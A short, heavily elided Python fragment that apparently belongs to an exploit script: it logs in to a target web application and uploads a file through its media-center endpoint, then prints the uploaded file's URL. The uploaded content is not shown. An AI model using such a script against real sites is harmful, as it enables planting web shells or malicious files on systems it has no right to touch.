...
with session() as r:
    login = r.post('http://' + str(host) + '/as/?type=signin', data=payload)
    ...
    if login.status_code == 200:
        ...
        if login.text.find(success) > 1:
            ...
            pass
        pass
    uploadfile = r.post('http://' + str(host) + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + str(host) + "/attachment/" + filename)
        pass  
